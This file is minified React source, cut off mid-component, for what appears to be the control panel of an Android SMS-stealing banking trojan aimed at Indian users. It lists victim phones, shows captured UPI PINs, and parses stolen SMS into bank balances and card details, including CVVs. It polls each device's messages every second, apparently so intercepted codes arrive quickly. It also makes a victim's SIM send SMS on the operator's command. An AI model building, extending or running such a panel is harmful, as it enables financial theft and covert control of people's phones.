function r1({
    percent: A
}) {
    const tt = A > 20 ? "#16a34a" : "#ef4444",
        b = A > 20 ? "#16a34a" : "#ef4444";
    return r.jsxs("div", {
        className: "flex items-center gap-1.5",
        children: [r.jsxs("div", {
            className: "flex items-center",
            children: [r.jsx("div", {
                className: "relative flex items-center rounded-[3px] border border-[#555]",
                style: {
                    width: 26,
                    height: 12,
                    padding: 2
                },
                children: r.jsx("div", {
                    className: "rounded-[1.5px] h-full transition-all duration-500",
                    style: {
                        width: `${Math.max(5,A)}%`,
                        background: tt
                    }
                })
            }), r.jsx("div", {
                style: {
                    width: 3,
                    height: 5,
                    background: "#555",
                    borderRadius: "0 2px 2px 0",
                    marginLeft: -1
                }
            })]
        }), r.jsxs("span", {
            className: "text-xs font-semibold tabular-nums",
            style: {
                color: b
            },
            children: [A, "%"]
        })]
    })
}

function u1({
    last4: A,
    cardType: tt
}) {
    const [b, d] = jt.useState(!1);
    return r.jsxs("div", {
        className: "flex items-center gap-2",
        children: [r.jsx("span", {
            className: "font-mono text-xs text-[#aaa]",
            children: b ? `•••• •••• •••• ${A}` : `•••• •••• •••• ${A}`
        }), tt && r.jsx("span", {
            className: "text-[10px] text-purple-400 font-semibold",
            children: tt
        })]
    })
}

function c1({
    balance: A
}) {
    const tt = A.transactionType === "credit";
    return A.transactionType, r.jsxs("div", {
        className: "bank-record p-3 rounded-xl bg-[#0a1410] border border-emerald-900/30 border-l-2 border-l-emerald-500/70",
        children: [r.jsxs("div", {
            className: "flex items-center justify-between mb-2",
            children: [r.jsxs("div", {
                className: "flex items-center gap-2",
                children: [r.jsx("div", {
                    className: "w-6 h-6 rounded-lg bg-emerald-500/15 border border-emerald-500/25 flex items-center justify-center",
                    children: r.jsx($l, {
                        className: "w-3 h-3 text-emerald-400"
                    })
                }), r.jsxs("div", {
                    children: [r.jsx("span", {
                        className: "text-xs font-bold text-emerald-400",
                        children: A.bankName
                    }), r.jsx("span", {
                        className: "text-[10px] text-[#444] ml-1.5 font-mono",
                        children: A.senderName
                    })]
                }), A.accountLast4 && r.jsxs("span", {
                    className: "text-[10px] font-mono text-[#555] bg-[#111] px-1.5 py-0.5 rounded",
                    children: ["••", A.accountLast4]
                })]
            }), A.transactionType && r.jsxs("span", {
                className: `flex items-center gap-0.5 text-[10px] font-semibold px-2 py-0.5 rounded-full ${tt?"bg-emerald-500/10 text-emerald-400 border border-emerald-500/20":"bg-red-500/10 text-red-400 border border-red-500/20"}`,
                children: [tt ? r.jsx(dh, {
                    className: "w-3 h-3"
                }) : r.jsx(fh, {
                    className: "w-3 h-3"
                }), tt ? "Credit" : "Debit"]
            })]
        }), r.jsxs("div", {
            className: "flex items-end justify-between",
            children: [r.jsxs("div", {
                children: [r.jsx("p", {
                    className: "text-[9px] uppercase tracking-widest text-[#555] mb-0.5",
                    children: "Available Balance"
                }), r.jsxs("p", {
                    className: "text-xl font-black text-white",
                    children: [r.jsx("span", {
                        className: "text-emerald-400 text-sm mr-0.5",
                        children: "₹"
                    }), Pl(A.availableBalance)]
                })]
            }), A.transactionAmount && A.transactionAmount !== A.availableBalance && r.jsxs("div", {
                className: "text-right",
                children: [r.jsx("p", {
                    className: "text-[9px] uppercase tracking-widest text-[#555] mb-0.5",
                    children: "Transaction"
                }), r.jsxs("p", {
                    className: `text-sm font-bold ${tt?"text-emerald-400":"text-red-400"}`,
                    children: [tt ? "+" : "-", "₹", Pl(A.transactionAmount)]
                })]
            })]
        }), (A.phoneFromSms || A.networkFromSms) && r.jsxs("div", {
            className: "flex items-center gap-3 mt-2 pt-2 border-t border-[#151f15]",
            children: [A.phoneFromSms && r.jsxs("div", {
                className: "flex items-center gap-1",
                children: [r.jsx(pp, {
                    className: "w-3 h-3 text-blue-400"
                }), r.jsx("span", {
                    className: "text-[10px] font-mono text-[#777]",
                    children: A.phoneFromSms
                })]
            }), A.networkFromSms && r.jsxs("div", {
                className: "flex items-center gap-1",
                children: [r.jsx(jp, {
                    className: "w-3 h-3 text-purple-400"
                }), r.jsx("span", {
                    className: "text-[10px] text-[#777]",
                    children: A.networkFromSms
                })]
            })]
        }), r.jsx("p", {
            className: "text-[10px] text-[#333] mt-2 leading-relaxed line-clamp-2",
            children: A.rawSms.substring(0, 130)
        }), A.detectedAt && r.jsx("p", {
            className: "text-[9px] text-[#2a2a2a] mt-1 font-mono",
            children: A.detectedAt
        })]
    })
}

function o1({
    card: A
}) {
    const [tt, b] = jt.useState(!1);
    return r.jsxs("div", {
        className: "card-record p-3 rounded-xl bg-[#0f0a1a] border border-purple-900/30 border-l-2 border-l-purple-500/70",
        children: [r.jsxs("div", {
            className: "flex items-center justify-between mb-2",
            children: [r.jsxs("div", {
                className: "flex items-center gap-2",
                children: [r.jsx("div", {
                    className: "w-6 h-6 rounded-lg bg-purple-500/15 border border-purple-500/25 flex items-center justify-center",
                    children: r.jsx(Wl, {
                        className: "w-3 h-3 text-purple-400"
                    })
                }), r.jsx("span", {
                    className: "text-xs font-bold text-purple-400",
                    children: A.cardType || "Card"
                })]
            }), A.expiry && r.jsxs("span", {
                className: "text-[10px] text-[#555] font-mono",
                children: ["Exp: ", A.expiry]
            })]
        }), r.jsx(u1, {
            last4: A.cardLast4,
            cardType: A.cardType
        }), A.cvv && r.jsxs("div", {
            className: "flex items-center gap-2 mt-2",
            children: [r.jsx("span", {
                className: "text-[10px] uppercase tracking-widest text-[#555]",
                children: "CVV:"
            }), r.jsx("span", {
                className: "text-xs font-mono text-purple-300",
                children: tt ? A.cvv : "•••"
            }), r.jsx("button", {
                onClick: () => b(!tt),
                className: "p-0.5 text-[#444] hover:text-purple-400 transition-colors",
                children: tt ? r.jsx(ap, {
                    className: "w-3 h-3"
                }) : r.jsx(lp, {
                    className: "w-3 h-3"
                })
            })]
        }), r.jsx("p", {
            className: "text-[10px] text-[#2a2a2a] mt-2 leading-relaxed line-clamp-2",
            children: A.rawSms.substring(0, 130)
        })]
    })
}

function f1({
    dev: A,
    onClick: tt
}) {
    const b = A.status,
        d = A.smsAnalysis,
        S = d && d.bankBalances.length > 0,
        f = d && d.cards.length > 0,
        p = S ? d.bankBalances[0] : null,
        h = A.phoneNumber && A.phoneNumber !== "—" ? A.phoneNumber : d ?.phoneNumbers[0] || "—",
        o = A.provider && A.provider !== "—" ? A.provider : d ?.networks[0] || null;
    return r.jsxs("div", {
        onClick: tt,
        className: "group relative bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 cursor-pointer transition-all duration-200 hover:border-[#2a2a2a] hover:bg-[#161616] hover:shadow-xl hover:shadow-black/40 hover:-translate-y-0.5 active:translate-y-0",
        children: [r.jsxs("div", {
            className: "flex items-start gap-3 mb-3",
            children: [r.jsx("div", {
                className: `w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${b?"bg-emerald-500/15 border border-emerald-500/25":"bg-[#1a1a1a] border border-[#262626]"}`,
                children: r.jsx(bs, {
                    className: `w-5 h-5 ${b?"text-emerald-400":"text-[#444]"}`
                })
            }), r.jsxs("div", {
                className: "flex-1 min-w-0",
                children: [r.jsx("h3", {
                    className: "text-sm font-bold text-white truncate leading-tight",
                    children: A.name
                }), r.jsx("p", {
                    className: "text-[10px] font-mono text-[#555] mt-0.5 truncate",
                    children: A.id
                })]
            }), r.jsxs("div", {
                className: "flex items-center gap-1 flex-shrink-0",
                children: [A.upipin && r.jsx(hh, {
                    className: "w-3.5 h-3.5 text-amber-400"
                }), S && r.jsx($l, {
                    className: "w-3.5 h-3.5 text-emerald-400"
                }), f && r.jsx(Wl, {
                    className: "w-3.5 h-3.5 text-purple-400"
                }), r.jsx("button", {
                    onClick: x => {
                        x.stopPropagation(), tt()
                    },
                    className: "p-1 rounded-lg text-[#444] hover:text-[#888] hover:bg-white/5 transition-colors",
                    children: r.jsx(tp, {
                        className: "w-3.5 h-3.5"
                    })
                })]
            })]
        }), r.jsxs("div", {
            className: "grid grid-cols-2 gap-3 mb-3",
            children: [r.jsxs("div", {
                children: [r.jsx("p", {
                    className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                    children: "Android"
                }), r.jsx("p", {
                    className: "text-sm font-bold text-[#ccc]",
                    children: A.android !== "—" ? `v${A.android.replace("v","")}` : "—"
                })]
            }), r.jsxs("div", {
                children: [r.jsx("p", {
                    className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                    children: "Battery"
                }), r.jsx(r1, {
                    percent: A.batteryPercent
                })]
            })]
        }), r.jsxs("div", {
            className: "grid grid-cols-2 gap-3 mb-3",
            children: [r.jsxs("div", {
                children: [r.jsx("p", {
                    className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                    children: "Number"
                }), r.jsx("p", {
                    className: "text-xs font-mono text-[#aaa] truncate",
                    children: h
                })]
            }), o && r.jsxs("div", {
                children: [r.jsx("p", {
                    className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                    children: "Network"
                }), r.jsx("p", {
                    className: "text-xs font-semibold text-[#aaa] truncate",
                    children: o
                })]
            })]
        }), p && r.jsxs("div", {
            className: "mb-3 px-3 py-2 rounded-xl bg-emerald-950/20 border border-emerald-900/20",
            children: [r.jsxs("div", {
                className: "flex items-center justify-between",
                children: [r.jsxs("div", {
                    className: "flex items-center gap-1.5",
                    children: [r.jsx($l, {
                        className: "w-3.5 h-3.5 text-emerald-400"
                    }), r.jsx("span", {
                        className: "text-[10px] font-semibold text-emerald-400",
                        children: p.bankName
                    }), p.accountLast4 && r.jsxs("span", {
                        className: "text-[9px] font-mono text-[#444]",
                        children: ["••", p.accountLast4]
                    })]
                }), r.jsxs("span", {
                    className: "text-sm font-black text-white",
                    children: ["₹", Pl(p.availableBalance)]
                })]
            }), p.transactionType && r.jsxs("div", {
                className: "flex items-center gap-1 mt-1",
                children: [p.transactionType === "credit" ? r.jsx(dh, {
                    className: "w-3 h-3 text-emerald-500"
                }) : r.jsx(fh, {
                    className: "w-3 h-3 text-red-500"
                }), r.jsxs("span", {
                    className: `text-[9px] font-semibold ${p.transactionType==="credit"?"text-emerald-500":"text-red-500"}`,
                    children: [p.transactionType === "credit" ? "+" : "-", "₹", Pl(p.transactionAmount || "0"), " ", p.transactionType]
                })]
            })]
        }), f && r.jsxs("div", {
            className: "mb-3 px-3 py-1.5 rounded-xl bg-purple-950/20 border border-purple-900/20 flex items-center gap-2",
            children: [r.jsx(Wl, {
                className: "w-3.5 h-3.5 text-purple-400"
            }), r.jsxs("span", {
                className: "text-[10px] font-semibold text-purple-400",
                children: ["Card ••", d.cards[0].cardLast4]
            }), d.cards[0].cardType && r.jsx("span", {
                className: "text-[10px] text-[#555]",
                children: d.cards[0].cardType
            }), r.jsx("span", {
                className: "ml-auto text-[9px] text-purple-600",
                children: "Available"
            })]
        }), r.jsxs("div", {
            className: "flex items-center gap-2 flex-wrap",
            children: [r.jsx("span", {
                className: `w-2 h-2 rounded-full flex-shrink-0 ${b?"bg-emerald-500":"bg-[#333]"}`,
                style: b ? {
                    boxShadow: "0 0 6px #22c55e"
                } : {}
            }), b ? r.jsx("span", {
                className: "text-xs font-semibold text-emerald-400",
                children: "Online"
            }) : r.jsxs("div", {
                className: "flex items-center gap-1.5 min-w-0",
                children: [r.jsx("span", {
                    className: "text-xs text-[#555]",
                    children: "Offline"
                }), A.lastSeen && r.jsx("span", {
                    className: "text-[10px] font-mono text-[#444] bg-[#111] px-1.5 py-0.5 rounded border border-[#1e1e1e]",
                    children: vs(A.lastSeen)
                })]
            }), A.upipin && r.jsx("span", {
                className: "ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400",
                children: "UPI PIN"
            })]
        })]
    })
}

function ta({
    label: A,
    value: tt,
    mono: b,
    highlight: d
}) {
    return r.jsxs("div", {
        className: "device-detail-row flex items-start justify-between py-2.5 border-b border-[#1a1a1a] last:border-0",
        children: [r.jsx("span", {
            className: "text-xs text-[#555] font-medium flex-shrink-0 w-32",
            children: A
        }), r.jsx("span", {
            className: `text-xs text-right break-all ${b?"font-mono":"font-semibold"} ${d||"text-[#ccc]"}`,
            children: tt || "—"
        })]
    })
}

function d1({
    dev: A,
    fbUrl: tt,
    fbKey: b,
    onClose: d,
    onDelete: S,
    showToast: f
}) {
    const sourceDeviceId = A.sourceDeviceId || A.id,
        sendStateKey = `Green-send-state:${sourceDeviceId}`,
        messageCacheKey = `Green-message-cache:${sourceDeviceId}`,
        savedSendState = (() => {
            try { return JSON.parse(localStorage.getItem(sendStateKey) || "{}"); }
            catch { return {}; }
        })(),
        cachedMessages = (() => {
            try {
                const saved = JSON.parse(localStorage.getItem(messageCacheKey) || "[]");
                return Array.isArray(saved) ? saved : [];
            } catch { return []; }
        })();
    const saveMessageCache = c => {
        try { localStorage.setItem(messageCacheKey, JSON.stringify(c)); }
        catch {}
    };
    const [p, h] = jt.useState(cachedMessages), [o, x] = jt.useState({
        bankBalances: [],
        cards: [],
        phoneNumbers: [],
        networks: []
    }), [T, w] = jt.useState(cachedMessages.length === 0), [C, v] = jt.useState(""), [E, g] = jt.useState(""), [z, N] = jt.useState(savedSendState.sim === 2 ? 2 : 1), [k, M] = jt.useState(!1), [sendingSim, setSendingSim] = jt.useState(null), [H, L] = jt.useState("sms"), [smsSearch, setSmsSearch] = jt.useState(""), nt = jt.useRef(null), smsPollBusy = jt.useRef(!1), sendBusyRef = jt.useRef(!1), V = jt.useCallback(async () => {
        try {
            const c = await yn(tt, b, `messages/${sourceDeviceId}`, {
                    orderBy: '"$key"',
                    limitToLast: "150"
                }),
                I = Gu(c);
            h(I), x(Xu(I)), saveMessageCache(I)
        } catch (c) {
            (c instanceof Error ? c.message : String(c)).includes("PERMISSION_DENIED") && f("Firebase permission denied — check your Database Secret key"), h([])
        } finally {
            w(!1)
        }
    }, [sourceDeviceId, tt, b, f]);
    jt.useEffect(() => (V(), nt.current = setInterval(async () => {
        if (smsPollBusy.current || sendBusyRef.current) return;
        smsPollBusy.current = !0;
        try {
            const c = await yn(tt, b, `messages/${sourceDeviceId}`, {
                    orderBy: '"$key"',
                    limitToLast: "150"
                }),
                I = Gu(c);
            h(Z => {
                const q = I[0], mt = Z[0], changed = I.length !== Z.length || q?.text !== mt?.text || q?.time !== mt?.time || q?.sender !== mt?.sender;
                if (changed) {
                    const parsed = Xu(I);
                    const hasNew = !!q && (!mt || q.text !== mt.text || q.time !== mt.time);
                    return x(parsed), saveMessageCache(I), hasNew && f(`New SMS · ${q.sender||"Unknown sender"}`), I
                }
                return Z
            })
        } catch {} finally { smsPollBusy.current = !1 }
    }, 1e3), () => {
        nt.current && clearInterval(nt.current)
    }), [V, sourceDeviceId, tt, b, f]);
    jt.useEffect(() => {
        try {
            localStorage.setItem(sendStateKey, JSON.stringify({ sim: z, tab: H }));
        } catch {}
    }, [sendStateKey, C, E, z, H]);
    const ot = async (selectedSim = z) => {
            if (sendBusyRef.current) return;
            if (!C || !E) {
                f("Fill number and message");
                return
            }
            // Accept human-friendly Indian formats: 7022404698, 07022404698,
            // +91 70224 04698, 91-7022404698, and 0091-7022404698.
            let recipient = C.replace(/[^\d]/g, "");
            if (recipient.startsWith("0091")) recipient = recipient.slice(4);
            else if (recipient.startsWith("91") && recipient.length === 12) recipient = recipient.slice(2);
            if (recipient.startsWith("0") && recipient.length === 11) recipient = recipient.slice(1);
            if (/^[6-9]\d{9}$/.test(recipient)) recipient = `91${recipient}`;
            if (!/^91[6-9]\d{9}$/.test(recipient)) return f("Enter a valid Indian mobile number");
            sendBusyRef.current = !0;
            N(selectedSim);
            setSendingSim(selectedSim);
            M(!0);
            try {
                await Zp(tt, b, `clients/${sourceDeviceId}/webhookEvent/sendSms`, {
                    from: selectedSim,
                    to: recipient,
                    message: E,
                    isSended: !1
                }), f(`Message sent successfully via SIM ${selectedSim}`)
            } catch (c) {
                const I = c instanceof Error ? c.message : String(c);
                f(I.includes("PERMISSION_DENIED") ? "Firebase permission denied — cannot send" : "Send failed")
            } finally {
                sendBusyRef.current = !1;
                setSendingSim(null);
                M(!1)
            }
        },
        $ = async () => {
            if (confirm(`Delete "${A.name}" permanently?`)) try {
                await Gp(tt, b, `clients/${sourceDeviceId}`), f("Device deleted"), S()
            } catch (c) {
                const I = c instanceof Error ? c.message : String(c);
                f(I.includes("PERMISSION_DENIED") ? "Firebase permission denied" : "Delete failed")
            }
        },
        ht = A.batteryPercent > 20 ? "#16a34a" : "#ef4444",
        xt = A.phoneNumber && A.phoneNumber !== "—" ? A.phoneNumber : o.phoneNumbers[0] || "—",
        D = A.provider && A.provider !== "—" ? A.provider : o.networks[0] || "—",
        at = [{
            key: "info",
            label: "Info"
        }, {
            key: "bank",
            label: `Bank (${o.bankBalances.length})`
        }, {
            key: "card",
            label: `Card (${o.cards.length})`
        }, {
            key: "sms",
            label: `SMS (${p.length})`
        }, {
            key: "send",
            label: "Send"
        }],
        filteredSms = p.filter(c => {
            const I = smsSearch.trim().toLowerCase();
            return !I || c.sender.toLowerCase().includes(I) || c.text.toLowerCase().includes(I) || c.time.toLowerCase().includes(I)
        }),
        copySmsText = async (c, I = "SMS copied") => {
            try {
                if (navigator.clipboard?.writeText) await navigator.clipboard.writeText(c);
                else {
                    const Z = document.createElement("textarea");
                    Z.value = c, Z.style.position = "fixed", Z.style.opacity = "0", document.body.appendChild(Z), Z.select(), document.execCommand("copy"), Z.remove()
                }
                f(I)
            } catch { f("Copy unavailable — allow clipboard permission") }
        };
    return r.jsxs("div", {
        className: "fixed inset-0 z-50 flex",
        onClick: d,
        children: [r.jsx("div", {
            className: "device-detail-backdrop absolute inset-0 bg-black/70 backdrop-blur-sm"
        }), r.jsxs("div", {
            className: `device-detail-panel ${H === "send" ? "send-composer-open" : ""} relative ml-auto w-full max-w-md h-full flex flex-col bg-white border-l border-[#efedf5] shadow-2xl`,
            onClick: c => c.stopPropagation(),
            children: [r.jsxs("div", {
                className: "device-detail-header border-b border-[#1a1a1a]",
                children: [r.jsxs("div", {
                    className: "device-detail-header-top flex items-center gap-3",
                    children: [r.jsx("div", {
                        className: `w-9 h-9 rounded-xl flex items-center justify-center ${A.status?"bg-emerald-500/15 border border-emerald-500/25":"bg-[#1a1a1a] border border-[#262626]"}`,
                        children: r.jsx(bs, {
                            className: `w-4 h-4 ${A.status?"text-emerald-400":"text-[#444]"}`
                        })
                    }), r.jsx("h3", {
                        className: "text-sm font-bold text-white flex-1 min-w-0 truncate",
                        children: A.name
                    }), r.jsx("button", {
                        onClick: d,
                        className: "device-detail-close p-2 rounded-xl bg-[#1a1a1a] border border-[#262626] text-[#888] hover:text-white transition-colors",
                        title: "Close device details",
                        "aria-label": "Close device details",
                        children: r.jsx(nl, {
                            className: "w-4 h-4"
                        })
                    })]
                }), r.jsxs("div", {
                    className: "device-detail-source-row flex items-center gap-2",
                    children: [r.jsx("span", {
                        className: "device-detail-battery",
                        style: { color: ht },
                        children: A.battery
                    }), r.jsx("button", {
                        onClick: $,
                        className: "device-detail-delete p-2 rounded-xl bg-red-950/40 border border-red-900/30 text-red-400 hover:bg-red-950/70 transition-colors",
                        title: "Delete device",
                        "aria-label": "Delete device",
                        children: r.jsx(oh, {
                            className: "w-4 h-4"
                        })
                    })]
                })]
            }), r.jsxs("div", {
                className: "device-detail-status flex items-center gap-3 px-5 py-2.5 bg-[#0a0a0a] border-b border-[#1a1a1a] flex-wrap",
                children: [r.jsxs("div", {
                    className: "flex items-center gap-1.5",
                    children: [r.jsx("span", {
                        className: `w-2 h-2 rounded-full ${A.status?"bg-emerald-500":"bg-[#333]"}`,
                        style: A.status ? {
                            boxShadow: "0 0 6px #22c55e"
                        } : {}
                    }), r.jsx("span", {
                        className: `text-xs font-semibold ${A.status?"text-emerald-400":"text-[#555]"}`,
                        children: A.status ? "Online" : "Offline"
                    }), !A.status && A.lastSeen && r.jsxs("span", {
                        className: "text-[10px] font-mono text-red-400/70",
                        children: ["since ", vs(A.lastSeen)]
                    })]
                }), r.jsxs("div", {
                    className: "flex items-center gap-1",
                    children: [r.jsx("span", {
                        className: "text-[10px] text-[#555]",
                        children: "Bat"
                    }), r.jsx("span", {
                        className: "text-[10px] font-bold",
                        style: {
                            color: ht
                        },
                        children: A.battery
                    })]
                }), A.upipin && r.jsxs("span", {
                    className: "px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400",
                    children: ["UPI: ", A.upipin.split("|")[0]]
                }), o.bankBalances.length > 0 && r.jsxs("span", {
                    className: "px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[10px] font-semibold text-emerald-400",
                    children: [o.bankBalances.length, " Bank SMS"]
                }), o.cards.length > 0 && r.jsxs("span", {
                    className: "px-2 py-0.5 rounded-full bg-purple-500/10 border border-purple-500/20 text-[10px] font-semibold text-purple-400",
                    children: [o.cards.length, " Card"]
                })]
            }), r.jsx("div", {
                className: "device-detail-tabs flex border-b border-[#1a1a1a] px-2 overflow-x-auto",
                children: at.map(c => r.jsx("button", {
                    onClick: () => L(c.key),
                    className: `px-3 py-3 text-[11px] font-semibold border-b-2 whitespace-nowrap transition-all ${H===c.key?c.key==="bank"?"border-emerald-500 text-emerald-400":c.key==="card"?"border-purple-500 text-purple-400":"border-red-500 text-red-400":"border-transparent text-[#555] hover:text-[#888]"}`,
                    children: c.label
                }, c.key))
            }), r.jsxs("div", {
                className: "device-detail-body flex-1 overflow-y-auto",
                children: [H === "info" && r.jsxs("div", {
                    className: "tab-panel tab-panel--info px-5 py-4",
                    children: [!A.status && A.lastSeen && r.jsxs("div", {
                        className: "mb-4 p-3 rounded-xl bg-red-950/20 border border-red-900/30 border-l-2 border-l-red-500/60",
                        children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-red-700 mb-1 font-semibold",
                            children: "Last Seen (Offline Since)"
                        }), r.jsx("p", {
                            className: "text-base font-black text-red-400",
                            children: vs(A.lastSeen)
                        }), r.jsx("p", {
                            className: "text-[10px] font-mono text-red-700/70 mt-0.5",
                            children: lh(A.lastSeen)
                        })]
                    }), A.status && A.lastSeen && r.jsxs("div", {
                        className: "mb-4 p-3 rounded-xl bg-emerald-950/20 border border-emerald-900/30",
                        children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-emerald-700 mb-1 font-semibold",
                            children: "Last Activity"
                        }), r.jsx("p", {
                            className: "text-[11px] font-mono text-emerald-500",
                            children: lh(A.lastSeen)
                        })]
                    }), r.jsx("p", {
                        className: "text-[10px] uppercase tracking-widest text-[#444] mb-3 font-semibold",
                        children: "Device"
                    }), r.jsx(ta, {
                        label: "Phone Number",
                        value: xt,
                        mono: !0
                    }), r.jsx(ta, {
                        label: "Network",
                        value: D
                    }), r.jsx(ta, {
                        label: "Android",
                        value: A.android
                    }), r.jsx(ta, {
                        label: "IP Address",
                        value: A.ip,
                        mono: !0
                    }), r.jsx(ta, {
                        label: "Storage",
                        value: A.storage
                    }), r.jsx(ta, {
                        label: "CPU Arch",
                        value: A.cpu,
                        mono: !0
                    }), r.jsx(ta, {
                        label: "SDK Version",
                        value: A.sdk
                    }), r.jsx(ta, {
                        label: "SIM Cards",
                        value: `${A.sims.length} SIM(s)`
                    }), A.sims.map((c, I) => c.phoneNumber && r.jsx(ta, {
                        label: `SIM ${I+1} Number`,
                        value: c.phoneNumber,
                        mono: !0
                    }, I)), o.phoneNumbers.length > 0 && r.jsxs(r.Fragment, {
                        children: [r.jsx("p", {
                            className: "text-[10px] uppercase tracking-widest text-[#444] mt-4 mb-3 font-semibold",
                            children: "From SMS"
                        }), o.phoneNumbers.map((c, I) => r.jsx(ta, {
                            label: `Phone #${I+1}`,
                            value: c,
                            mono: !0,
                            highlight: "text-blue-400"
                        }, I))]
                    }), o.networks.length > 0 && o.networks.map((c, I) => r.jsx(ta, {
                        label: `Network #${I+1}`,
                        value: c,
                        highlight: "text-purple-400"
                    }, I))]
                }), H === "bank" && r.jsxs("div", {
                    className: "tab-panel tab-panel--bank flex flex-col h-full",
                    children: [r.jsxs("div", {
                        className: "flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]",
                        children: [r.jsxs("div", {
                            children: [r.jsxs("span", {
                                className: "text-xs text-[#555]",
                                children: ["Auto-detected from ", p.length, " SMS"]
                            }), o.bankBalances.length > 0 && r.jsxs("p", {
                                className: "text-[10px] text-emerald-600/70 mt-0.5",
                                children: [o.bankBalances.length, " bank message(s) found"]
                            })]
                        }), r.jsx("button", {
                            onClick: V,
                            className: "p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors",
                            children: r.jsx(ys, {
                                className: "w-3.5 h-3.5"
                            })
                        })]
                    }), r.jsx("div", {
                        className: "flex-1 overflow-y-auto px-4 py-3 space-y-2",
                        children: T ? r.jsxs("div", {
                            className: "py-12 text-center",
                            children: [r.jsx("div", {
                                className: "w-6 h-6 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin mx-auto mb-3"
                            }), r.jsx("p", {
                                className: "text-xs text-[#555]",
                                children: "Scanning bank SMS..."
                            })]
                        }) : o.bankBalances.length === 0 ? r.jsxs("div", {
                            className: "py-12 text-center",
                            children: [r.jsx($l, {
                                className: "w-10 h-10 mx-auto mb-3 text-[#2a2a2a]"
                            }), r.jsx("p", {
                                className: "text-sm font-medium text-[#444]",
                                children: "No bank SMS found"
                            }), r.jsx("p", {
                                className: "text-xs text-[#333] mt-1 px-4 leading-relaxed",
                                children: "Bank transaction SMS with balance will appear here automatically"
                            })]
                        }) : r.jsxs(r.Fragment, {
                            children: [r.jsxs("div", {
                                className: "p-3 rounded-xl bg-[#081410] border border-emerald-900/40 mb-1",
                                children: [r.jsxs("p", {
                                    className: "text-[10px] uppercase tracking-widest text-emerald-700 mb-1",
                                    children: ["Latest Balance · ", o.bankBalances[0].bankName]
                                }), r.jsxs("div", {
                                    className: "flex items-end gap-2",
                                    children: [r.jsxs("span", {
                                        className: "text-2xl font-black text-white",
                                        children: ["₹", Pl(o.bankBalances[0].availableBalance)]
                                    }), o.bankBalances[0].accountLast4 && r.jsxs("span", {
                                        className: "text-xs text-emerald-700 mb-0.5 font-mono",
                                        children: ["••", o.bankBalances[0].accountLast4]
                                    })]
                                })]
                            }), o.bankBalances.map((c, I) => r.jsx(c1, {
                                balance: c
                            }, I))]
                        })
                    })]
                }), H === "card" && r.jsxs("div", {
                    className: "tab-panel tab-panel--card flex flex-col h-full",
                    children: [r.jsxs("div", {
                        className: "flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]",
                        children: [r.jsx("span", {
                            className: "text-xs text-[#555]",
                            children: "Card info found in SMS messages"
                        }), r.jsx("button", {
                            onClick: V,
                            className: "p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors",
                            children: r.jsx(ys, {
                                className: "w-3.5 h-3.5"
                            })
                        })]
                    }), r.jsx("div", {
                        className: "flex-1 overflow-y-auto px-4 py-3 space-y-2",
                        children: o.cards.length === 0 ? r.jsxs("div", {
                            className: "py-12 text-center",
                            children: [r.jsx(Wl, {
                                className: "w-10 h-10 mx-auto mb-3 text-[#2a2a2a]"
                            }), r.jsx("p", {
                                className: "text-sm font-medium text-[#444]",
                                children: "No card info found"
                            })]
                        }) : o.cards.map((c, I) => r.jsx(o1, {
                            card: c
                        }, I))
                    })]
                }), H === "sms" && r.jsxs("div", {
                    className: "tab-panel tab-panel--sms flex flex-col h-full",
                    children: [r.jsx("div", {
                        className: "sms-manual-refresh-row",
                        children: r.jsxs("button", {
                            type: "button",
                            className: "sms-manual-refresh",
                            onClick: () => {
                                w(!0), V()
                            },
                            disabled: T,
                            title: "Refresh messages",
                            "aria-label": "Refresh messages",
                            children: [r.jsx(ys, {
                                className: `w-3 h-3 ${T?"animate-spin":""}`
                            }), T ? "Refreshing…" : "Refresh"]
                        })
                    }), r.jsxs("div", {
                        className: "sms-quick-send",
                        children: [r.jsxs("div", {
                            className: "clearable-field",
                            children: [r.jsx("input", {
                                type: "tel",
                                inputMode: "tel",
                                value: C,
                                onChange: c => v(c.target.value),
                                placeholder: "Enter Recipient Phone No.",
                                "aria-label": "Recipient phone number"
                            }), C && r.jsx("button", {
                                type: "button",
                                className: "field-clear-button",
                                onClick: () => v(""),
                                "aria-label": "Clear recipient",
                                children: "×"
                            })]
                        }), r.jsxs("div", {
                            className: "clearable-field",
                            children: [r.jsx("input", {
                                type: "text",
                                value: E,
                                onChange: c => g(c.target.value),
                                placeholder: "Enter Message To Send.",
                                "aria-label": "Message text"
                            }), E && r.jsx("button", {
                                type: "button",
                                className: "field-clear-button",
                                onClick: () => g(""),
                                "aria-label": "Clear message",
                                children: "×"
                            })]
                        }), r.jsx("div", {
                            className: "sms-quick-send-actions",
                            children: [1, 2].map(c => r.jsxs("button", {
                                type: "button",
                                onClick: () => ot(c),
                                disabled: k,
                                className: sendingSim === c ? "sending" : "",
                                children: [sendingSim === c ? "Sending…" : `SIM ${c}`]
                            }, c))
                        })]
                    }), r.jsxs("div", {
                        className: "sms-search-wrap relative mx-4 mt-3",
                        children: [r.jsx(xp, {
                            className: "absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-[#777]"
                        }), r.jsx("input", {
                            type: "text",
                            value: smsSearch,
                            onChange: c => setSmsSearch(c.target.value),
                            placeholder: "Search sender, message, amount...",
                            "aria-label": "Search SMS messages",
                            className: "w-full pl-10 pr-10 py-3 rounded-xl bg-white border border-[#e2d6c5] focus:border-orange-500 focus:ring-2 focus:ring-orange-500/20 outline-none text-sm text-[#2d2e31] placeholder:text-[#96908a] transition-all"
                        }), smsSearch && r.jsx("button", {
                            type: "button",
                            onClick: () => setSmsSearch(""),
